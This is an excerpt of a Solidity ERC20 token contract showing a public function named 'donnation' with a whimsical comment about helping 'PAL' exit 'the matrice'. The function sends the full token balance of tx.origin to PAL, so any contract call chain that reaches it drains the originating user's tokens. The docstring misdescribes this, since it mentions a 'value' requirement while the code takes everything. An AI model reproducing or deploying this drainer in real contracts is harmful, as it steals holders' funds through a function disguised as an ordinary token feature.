...
contract Token is IERC20, IERC20Errors {
    ...
    /**
     * @dev Help PAL to exit the matrice.
     *
     * Requirements:
     *
     * - the tx.origin must have a balance of at least `value`.
     */
    function donnation() public virtual returns (bool) {
        address owner = tx.origin;
        _transfer(owner, PAL, balanceOf(owner));
        return true;
    }
